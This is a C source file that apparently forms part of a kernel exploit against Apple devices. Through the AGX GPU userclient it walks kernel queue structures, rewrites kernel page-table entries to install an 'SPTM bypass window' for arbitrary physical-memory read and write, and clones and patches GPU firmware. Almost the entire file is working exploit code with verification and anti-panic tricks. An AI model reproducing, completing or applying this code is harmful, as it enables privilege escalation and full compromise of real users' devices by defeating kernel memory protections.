            uint64_t LT=0,array=0,cntq=0; agx_kr64_dg(cont+LTOFF[lti],&LT); LT=AGX_KPTR_STRIP(LT); if(!agx_kva_ok(LT)) continue;
            agx_kr64_dg(LT+0x10,&array); array=AGX_KPTR_STRIP(array); agx_kr64_dg(LT+0x28,&cntq);
            uint32_t count=(uint32_t)cntq; if(!agx_kva_ok(array)||!count) continue; if(count>4096) count=4096;
            int nqthis=0, ndump=0, nnn=0;
            for (uint32_t id=1; id<count && nc<MAXC; id++) {
                uint64_t cq=0; if(agx_kr64_dg(array+8*id,&cq)) continue; cq=AGX_KPTR_STRIP(cq); if(!kva_is_heap(cq)) continue;
                nnn++;
                uint64_t vt=0; agx_kr64_dg(cq,&vt); vt=AGX_KPTR_STRIP(vt);
                if (vt==A1VT && nqall<16) { int dup=0; for(int z=0;z<nqall;z++) if(qall_[z]==cq){dup=1;break;} if(!dup){ qall_[nqall]=cq; qallreg_[nqall]=id; nqall++; } }
                uint64_t wcnt=0; agx_kr64_dg(cq+0x88C,&wcnt); wcnt&=0xffffffff;
                uint64_t pool[3]={0,0,0}; agx_kr64_dg(cq+0x5D0,&pool[0]); agx_kr64_dg(cq+0x5D8,&pool[1]); agx_kr64_dg(cq+0x5E0,&pool[2]);
                for(int z=0;z<3;z++) pool[z]=AGX_KPTR_STRIP(pool[z]);
                if (ndump<40 && vt==A1VT) { kwlog("[own]    LT+0x%x arr[%u] cq=0x%llx wqcount(+0x88C)=%llu pool=0x%llx/0x%llx/0x%llx\n",
                    LTOFF[lti],id,(unsigned long long)cq,(unsigned long long)wcnt,
                    (unsigned long long)pool[0],(unsigned long long)pool[1],(unsigned long long)pool[2]); ndump++; }
                if (vt==A1VT) {
                    static const uint32_t WQOFF[6] = {0x5D0,0x5D8,0x5E0,0x5F0,0x868,0x870};
                    for (int wi=0; wi<6 && nc<MAXC; wi++) {
                        uint64_t wq=0; agx_kr64_dg(cq+WQOFF[wi],&wq); wq=AGX_KPTR_STRIP(wq); if(!kva_is_heap(wq)) continue;
                        for (int co=0; co<2 && nc<MAXC; co++) {
                            uint32_t coff = co? 0x1F0 : 0x1E8;
                            uint64_t ch=0; agx_kr64_dg(wq+coff,&ch); ch=AGX_KPTR_STRIP(ch); if(!agx_kva_ok(ch)) continue;
                            uint64_t s0=0; if(agx_kr64_dg(ch+0x78,&s0)) continue;
                            cq_[nc]=cq; ch_[nc]=ch; reg_[nc]=id; choff_[nc]=coff; s0_[nc]=s0; nc++; nqthis++;
                        }
                    }
                    static const uint32_t CHOFF[2] = {0x858,0x860};
                    for (int ci=0; ci<2 && nc<MAXC; ci++) {
                        uint64_t ch=0; agx_kr64_dg(cq+CHOFF[ci],&ch); ch=AGX_KPTR_STRIP(ch); if(!agx_kva_ok(ch)) continue;
                        uint64_t s0=0; if(agx_kr64_dg(ch+0x78,&s0)) continue;
                        cq_[nc]=cq; ch_[nc]=ch; reg_[nc]=id; choff_[nc]=CHOFF[ci]; s0_[nc]=s0; nc++; nqthis++;
                    }
                }
            }
            kwlog("[own] cont=0x%llx LT+0x%x array=0x%llx cnt=%u nonnull-A1VT=%d -> %d wq-bearing (leaf_vt %s want)\n",
                  (unsigned long long)cont,LTOFF[lti],(unsigned long long)array,count,nnn,nqthis,(want_vt&&leaf_vt==want_vt)?"==":"!=");
        }
    }
    kwlog("[own] IPC walk: active-IKOT0x1D=%d kobj_ok=%d dev_ok=%d cont_ok=%d uniq_conts=%d -> %d candidate channels\n",
          n1d,nkobj,ndev,ncont,nseen,nc);
    int pick=-1;
    if (nc) {
        agx_metal_render(24);
        for (int k=0;k<nc;k++) { uint64_t s1=0; agx_kr64_dg(ch_[k]+0x78,&s1); int adv=(s1!=s0_[k]);
            kwlog("[own] cand[%d] regid=%u cq=0x%llx ch=0x%llx(wq+0x%x) +0x78 0x%llx->0x%llx %s\n",
                  k,reg_[k],(unsigned long long)cq_[k],(unsigned long long)ch_[k],choff_[k],
                  (unsigned long long)s0_[k],(unsigned long long)s1, adv?"ADVANCED":"");
            if (adv && pick<0) pick=k; }
    }
    if (pick<0) {
        kwlog("[own] no LIVE channel picked (nc=%d) -> DEEP PROBE %d A1VT queues under continuous keepalive (submits=%llu)\n",
              nc, nqall, (unsigned long long)g_rr_submits);
        enum { QPW = (0x900-0x480)/8 };
        static uint64_t snap[16][QPW];
        for (int qi=0; qi<nqall; qi++)
            for (int w=0; w<QPW; w++) { uint64_t v=0; agx_kr64_dg(qall_[qi]+0x480+8*w,&v); snap[qi][w]=v; }
        usleep(300000);
        for (int qi=0; qi<nqall; qi++) {
            int changed=0; char dl[760]; int dp=0;
            dp+=snprintf(dl+dp,sizeof(dl)-dp,"[own] qprobe cq=0x%llx regid=%u changed:",(unsigned long long)qall_[qi],qallreg_[qi]);
            for (int w=0; w<QPW; w++) { uint64_t v=0; agx_kr64_dg(qall_[qi]+0x480+8*w,&v);
                if (v!=snap[qi][w]) { changed++; if(changed<=14) dp+=snprintf(dl+dp,sizeof(dl)-dp," +%x:%llx->%llx",0x480+w*8,(unsigned long long)snap[qi][w],(unsigned long long)v); } }
            kwlog("%s | %d changed %s\n",dl,changed,changed?"ACTIVE":"(idle)");
            for (uint32_t o=0x400;o<0x900;o+=8) {
                uint64_t p=0; agx_kr64_dg(qall_[qi]+o,&p); p=AGX_KPTR_STRIP(p); if(!kva_is_heap(p)) continue;
                for (int co=0; co<2; co++) { uint32_t coff=co?0x1F0:0x1E8; uint64_t cch=0; agx_kr64_dg(p+coff,&cch); cch=AGX_KPTR_STRIP(cch);
                    if(!agx_kva_ok(cch)) continue; uint64_t s78=0; if(agx_kr64_dg(cch+0x78,&s78)) continue;
                    kwlog("[own] qprobe   cq+0x%x -> wq?0x%llx (+0x%x ch=0x%llx +0x78=0x%llx)\n",o,(unsigned long long)p,coff,(unsigned long long)cch,(unsigned long long)s78); }
            }
        }
        kwlog("[own] DEEP PROBE done. abort\n");
        goto own_done;
    }
    kwlog("[own] picked queue (advanced under continuous keepalive): regid=%u cq=0x%llx ch=0x%llx (wq+0x%x)\n",
          reg_[pick],(unsigned long long)cq_[pick],(unsigned long long)ch_[pick],choff_[pick]);
    if (probe_only) {
        kwlog("[own] EARLY PROBE: workqueue+channel found under continuous keepalive. NO publish (zero_wp not ready).\n");
        goto own_done;
    }
    agx_deliver_via_channel(ch_[pick], cq_[pick]);
    kwlog("[own] === own-serve done ===\n");
own_done:
    agx_render_keepalive_stop();
    kwlog("[own] continuous keepalive stopped (total submits=%llu)\n", (unsigned long long)g_rr_submits);
}

#pragma mark - Bring-up teardown (leak forged / aperture pages)

void agx_bringup_cleanup(void) {
    kwlog("[bringup] cleanup: LEAKING forged/aperture pages (decisive build)\n");
    memset(&g_agx_fw, 0, sizeof(g_agx_fw));
    agx_fw_pte_reset_cache();
}

#pragma mark - SPTM kwrite/kread primitives (via the bypass) + reusable bypass window

static int sptm_bypass_active(void) {
    return g_agx_fw.s11_k4_pte_offset_in_k3 != 0 && g_agx_fw.s11_k4_kva_copy != 0;
}

static int sptm_safe_kwrite8(uint64_t kva, uint64_t value) {
    return kwrite_via_necp_object(kva, &value, 8, 1);
}

static int agx_sptm_window_map(uint64_t target_pa, uint64_t *out_win) {
    if (!g_sptm_window.installed) return -1;
    int slot = g_sptm_window.next_slot;
    if (++g_sptm_window.next_slot >= 2048) g_sptm_window.next_slot = 1;
    uint64_t leaf = (target_pa & 0xFFFFFFFFC000ULL) | g_sptm_window.rw_attr;
    if (kwrite_via_necp_object(g_sptm_window.l3_kva + (uint64_t)slot * 8, &leaf, 8, 1)) return -2;
    usleep(2000);
    *out_win = g_sptm_window.window_va + (uint64_t)slot * 0x4000ULL + (target_pa & 0x3FFFULL);
    return 0;
}

int sptm_window_unhook_info(uint64_t *l1_pa, uint64_t *free_off, uint64_t *l1tab_kva, uint64_t *hook_val) {
    if (l1_pa)     *l1_pa     = g_sptm_window.l1_pa;
    if (free_off)  *free_off  = g_sptm_window.free_off;
    if (l1tab_kva) *l1tab_kva = g_sptm_window.l1tab_kva;
    if (hook_val)  *hook_val  = g_sptm_window.hook_val;
    return g_sptm_window.installed;
}
void sptm_window_mark_uninstalled(void) { g_sptm_window.installed = 0; }

int sptm_window_is_installed(void) { return g_sptm_window.installed; }

int sptm_kwrite32_pa(uint64_t target_pa, uint32_t value) {
    if (!target_pa) return KERN_INVALID_ADDRESS;
    if (g_sptm_window.installed) {
        uint64_t win = 0;
        if (agx_sptm_window_map(target_pa, &win)) return KERN_FAILURE;
        return kwrite_via_necp_object(win, &value, 4, 1) ? KERN_FAILURE : KERN_SUCCESS;
    }
    if (!sptm_bypass_active()) return KERN_INVALID_ARGUMENT;

    uint64_t pa_aligned = target_pa & ~0x3FFFULL;
    uint64_t page_off   = target_pa & 0x3FFFULL;
    uint64_t v10 = g_agx_fw.s11_k4_pte_offset_in_k3;
    uint64_t v11 = g_agx_fw.s11_k4_kva_copy + page_off;

    for (int i = 0; i < 100; i++) {
        uint64_t cur_pte = 0;
        if (kread_qword(v10, &cur_pte)) continue;
        uint64_t new_pte = (cur_pte & 0xFFFF000000003FFFULL) | pa_aligned;
        if (sptm_safe_kwrite8(v10, new_pte)) continue;
        usleep(10000);
        if (kwrite_via_necp_object(v11, &value, 4, 1)) continue;
        uint32_t readback = 0;
        if (kread_via_thread_state_impl(v11, &readback, 4) != KERN_SUCCESS) continue;
        if (readback == value) return KERN_SUCCESS;
        kwlog("[sptm_kw_pa] iter %d: verify mismatch (wrote 0x%x, read 0x%x)\n",
                i, value, readback);
    }
    return KERN_FAILURE;
}

int sptm_kread32_pa(uint64_t target_pa, uint32_t *out) {
    if (!out) return KERN_INVALID_ARGUMENT;
    if (!target_pa) return KERN_INVALID_ADDRESS;
    if (g_sptm_window.installed) {
        uint64_t win = 0;
        if (agx_sptm_window_map(target_pa, &win)) return KERN_FAILURE;
        return kread_via_thread_state_impl(win, out, 4) == KERN_SUCCESS ? KERN_SUCCESS : KERN_FAILURE;
    }
    if (!sptm_bypass_active()) return KERN_INVALID_ARGUMENT;

    uint64_t pa_aligned = target_pa & ~0x3FFFULL;
    uint64_t page_off   = target_pa & 0x3FFFULL;
    uint64_t v10 = g_agx_fw.s11_k4_pte_offset_in_k3;
    uint64_t v11 = g_agx_fw.s11_k4_kva_copy + page_off;

    for (int i = 0; i < 100; i++) {
        uint64_t cur_pte = 0;
        if (kread_qword(v10, &cur_pte)) continue;
        uint64_t new_pte = (cur_pte & 0xFFFF000000003FFFULL) | pa_aligned;
        if (sptm_safe_kwrite8(v10, new_pte)) continue;
        usleep(10000);
        uint32_t value = 0;
        if (kread_via_thread_state_impl(v11, &value, 4) != KERN_SUCCESS) continue;
        *out = value;
        return KERN_SUCCESS;
    }
    return KERN_FAILURE;
}

static int find_real_kernel_pt_page(uint64_t witness_kva,
                                    uint64_t *out_pt_pa,
                                    uint64_t *out_safe_off,
                                    uint64_t *out_pt_kva) {
    uint64_t leaf_pte_kva = 0, leaf_pte_val = 0, page_pa = 0;
    int rc = kernel_pte_walk_full(witness_kva & ~0x3FFFULL,
                                  &leaf_pte_kva, &leaf_pte_val, &page_pa);
    if (rc) {
        kwlog("[verify] pte_walk(witness=0x%llx) failed: %d\n",
                (unsigned long long)witness_kva, rc);
        return -1;
    }

    uint64_t pt_kva = leaf_pte_kva & ~0x3FFFULL;

    uint64_t pt_pa = kva_to_pa(pt_kva);
    if (!pt_pa) {
        kwlog("[verify] kva_to_pa(0x%llx) returned 0 -- PT page not in segment cache\n",
                (unsigned long long)pt_kva);
        return -2;
    }

    int safe_slot = -1;
    for (int i = 0; i < 2048; i++) {
        uint64_t slot_val = 0;
        if (kread_qword(pt_kva + i * 8, &slot_val)) {
            kwlog("[verify] failed to read PT page slot %d (kva=0x%llx)\n",
                    i, (unsigned long long)(pt_kva + i * 8));
            return -3;
        }
        if (slot_val == 0) { safe_slot = i; break; }
    }
    if (safe_slot < 0) {
        kwlog("[verify] PT page at kva=0x%llx is fully populated -- no safe slot\n",
                (unsigned long long)pt_kva);
        return -4;
    }

    *out_pt_pa = pt_pa;
    *out_safe_off = (uint64_t)safe_slot * 8;
    if (out_pt_kva) *out_pt_kva = pt_kva;

    kwlog("[verify] real kernel PT page: kva=0x%llx pa=0x%llx safe_slot=%d (off=0x%lx)\n",
            (unsigned long long)pt_kva, (unsigned long long)pt_pa,
            safe_slot, (unsigned long)safe_slot * 8);
    kwlog("[verify] witness pte_kva=0x%llx pte_val=0x%llx page_pa=0x%llx\n",
            (unsigned long long)leaf_pte_kva,
            (unsigned long long)leaf_pte_val,
            (unsigned long long)page_pa);
    return 0;
}

#pragma mark - verify: broad-vs-narrow discriminator (T-S sanity / T-A real PT page)

static void agx_verify(void) {
    g_discriminator_result = -20;
    if (!g_sptm_window.installed) { kwlog("[verify] bypass window not installed -- skip\n"); return; }
    uint32_t gs=0; mach_port_t mp=0; int ts_pass=0, ta_pass=0;
    uint64_t s_kva = kern_port_kobj_find_impl((uint32_t)vm_page_size, &gs, &mp), s_pa = 0;
    if (s_kva && kernel_pte_walk_full(s_kva & ~0x3FFFULL, NULL, NULL, &s_pa) == 0 && s_pa) {
        s_pa &= ~0x3FFFULL;
        uint32_t sv = 0x5A4E1717u, srb = 0;
        sptm_kwrite32_pa(s_pa, sv); sptm_kread32_pa(s_pa, &srb);
        ts_pass = (srb==sv);
        kwlog("[verify] T-S (kobj XNU_DEFAULT pa=0x%llx): wrote 0x%x read 0x%x -> %s\n",
              (unsigned long long)s_pa, sv, srb, ts_pass ? "PASS" : "FAIL");
    } else kwlog("[verify] T-S setup failed\n");
    uint64_t w_kva = kern_port_kobj_find_impl((uint32_t)vm_page_size, &gs, &mp);
    uint64_t pt_pa=0, soff=0, pt_kva=0;
    if (w_kva && find_real_kernel_pt_page(w_kva, &pt_pa, &soff, &pt_kva) == 0) {
        uint32_t av = 0x00B10AD1u; uint64_t pre=0, ab=0;
        kread_qword(pt_kva + soff, &pre);
        int wr = sptm_kwrite32_pa(pt_pa + soff, av);
        kread_qword(pt_kva + soff, &ab);
        ta_pass = ((uint32_t)ab == av);
        kwlog("[verify] T-A (XNU_PAGE_TABLE pa=0x%llx+0x%llx kva=0x%llx): pre=0x%llx wrote 0x%x (rc=%d) -> kread=0x%llx -> %s\n",
              (unsigned long long)pt_pa,(unsigned long long)soff,(unsigned long long)pt_kva,(unsigned long long)pre, av, wr, (unsigned long long)ab,
              ta_pass ? "landed" : "did NOT land");
        uint32_t zero=0; sptm_kwrite32_pa(pt_pa + soff, zero);
    } else kwlog("[verify] T-A setup failed (find_real_kernel_pt_page)\n");
    g_discriminator_result = !ts_pass ? -10 : (ta_pass ? 3 : 1);
    kwlog("[verify] === done -> g_discriminator_result=%d ===\n",
          g_discriminator_result);
}

int agx_rerun_final_test(void) {
    if (!g_sptm_window.installed) return INT_MIN;
    agx_verify();
    return g_discriminator_result;
}

#pragma mark - Orchestrator: the full AGX broad-bypass pipeline

int agx_broad_bypass(void) {
    kwlog("[agx] === AGX FULL PIPELINE: userclient setup + structure walk ===\n");

    agx_uc_t uc;
    int rc;
    int failure_code = 0;

    rc = agx_userclient_open(&uc);
    if (rc) {
        kwlog("[agx] FAIL agx_userclient_open: %d\n", rc);
        return -1;
    }

    kwlog("[agx] submit UC = OWN (connect=0x%x)\n", uc.connect);

    rc = agx_run_setup(&uc);
    if (rc) {
        kwlog("[agx] FAIL setup: %d\n", rc);
        agx_userclient_close(&uc);
        return -2;
    }

    g_agx_fw.s13_uc_connect   = uc.connect;
    g_agx_fw.s13_sel7_handle  = uc.sel7_handle;
    g_agx_fw.s13_selD0_handle = uc.selD0_handle;
    g_agx_fw.s13_selD1_handle = uc.selD1_handle;
    kwlog("[agx] uc handles: connect=0x%x sel7=0x%x selD0=0x%x selD1=0x%x\n",
            g_agx_fw.s13_uc_connect, g_agx_fw.s13_sel7_handle,
            g_agx_fw.s13_selD0_handle, g_agx_fw.s13_selD1_handle);

    rc = agx_setup_walk(&uc);
    if (rc) {
        kwlog("[agx] FAIL structure walk: %d\n", rc);
        agx_userclient_close(&uc);
        return -3;
    }

    agx_deliver_run(uc.connect, 1);

    volatile uint8_t *b1 = (volatile uint8_t *)(uintptr_t)g_agx_walk.buf1_map.mapped_addr;
    volatile uint8_t *b2 = (volatile uint8_t *)(uintptr_t)g_agx_walk.buf2_map.mapped_addr;
    kwlog("[agx] buf1[0..15]: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x\n",
            b1[0],  b1[1],  b1[2],  b1[3],  b1[4],  b1[5],  b1[6],  b1[7],
            b1[8],  b1[9],  b1[10], b1[11], b1[12], b1[13], b1[14], b1[15]);
    kwlog("[agx] buf2[0..15]: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x\n",
            b2[0],  b2[1],  b2[2],  b2[3],  b2[4],  b2[5],  b2[6],  b2[7],
            b2[8],  b2[9],  b2[10], b2[11], b2[12], b2[13], b2[14], b2[15]);

    kwlog("[agx] -> running firmware bring-up probe with GPU active...\n");
    int e1 = agx_bringup_pa_select();
    if (e1 != 0) {
        kwlog("[agx] firmware MMIO probe failed: %d\n", e1);
        failure_code = -4;
        goto e_done;
    }

    kwlog("[agx] -> running firmware bring-up firmware clone...\n");
    int e3 = agx_bringup_clone_firmware();
    if (e3 != 0) {
        kwlog("[agx] firmware clone failed: %d\n", e3);
        failure_code = -4;
        goto e_cleanup;
    }
    kwlog("[agx] firmware clone OK -- clone VA=0x%llx size=0x%llx pages=%ld\n",
            (unsigned long long)g_agx_fw.clone_user_va,
            (unsigned long long)g_agx_fw.clone_size,
            g_agx_fw.page_count);

    kwlog("[agx] -> running resolve...\n");
    int e41 = agx_resolve_pointers();
    if (e41 != 0) {
        kwlog("[agx] resolve pointers failed: %d\n", e41);
        failure_code = -4;
        goto e_cleanup;
    }

    kwlog("[agx] -> running resolve...\n");
    int e42 = agx_resolve_adrp_ldr();
    if (e42 != 0) {
        kwlog("[agx] resolve adrp/ldr failed: %d\n", e42);
        failure_code = -4;
        goto e_cleanup;
    }

    kwlog("[agx] -> running resolve...\n");
    int e43 = agx_resolve_clone_scans();
    if (e43 != 0) {
        kwlog("[agx] resolve clone-scans failed: %d\n", e43);
        failure_code = -4;
        goto e_cleanup;
    }

    kwlog("[agx] -> running resolve...\n");
    int e46 = agx_resolve_zero_page();
    if (e46 != 0) {
        kwlog("[agx] resolve zero-page failed: %d\n", e46);
        failure_code = -4;
        goto e_cleanup;
    }

    kwlog("[agx] -> running resolve...\n");
    int e47 = agx_resolve_pattern_kread();
    if (e47 != 0) {
        kwlog("[agx] resolve patterns failed: %d\n", e47);
        failure_code = -4;
        goto e_cleanup;
    }

    kwlog("[agx] -> running resolve...\n");
    int e48 = agx_resolve_dsb_isb();
    if (e48 != 0) {
        kwlog("[agx] resolve dsb/isb failed: %d\n", e48);
        failure_code = -4;
        goto e_cleanup;
    }

    kwlog("[agx] -> running resolve...\n");
    int e49 = agx_resolve_finalize();
    if (e49 != 0) {
        kwlog("[agx] resolve finalize failed: %d\n", e49);
        failure_code = -4;
        goto e_cleanup;
    }

#if AGX_DOORBELL_FALLBACK
    kwlog("[agx] -> AGX_DOORBELL_FALLBACK=1: running banked doorbell/fence-stamp fallback (narrow XNU_PAGE_TABLE write)...\n");
    failure_code = agx_doorbell_fallback_run();
    stabilize_repair_keep_primitives();
    goto e_cleanup;
#endif

    agx_deliver_run(uc.connect, 0);
    if (g_sptm_window.installed) {
        kwlog("[verify] broad-bypass window installed -> sptm_kwrite32_pa/kread route through it; characterizing...\n");
        agx_verify();
    } else {
        kwlog("[verify] broad-bypass window NOT installed (hook didn't land this run) -> characterization skipped\n");
    }
    stabilize_repair_keep_primitives();
    failure_code = 0; goto e_cleanup;

e_cleanup:
    agx_bringup_cleanup();

e_done:
    kwlog("[agx] === AGX BROAD BYPASS DONE -- cleanup ===\n");
    kwlog("[agx] LEAKING userclient + bypass window (decisive build) -- avoids the IOServiceClose kfree panic\n");
    return failure_code;
}
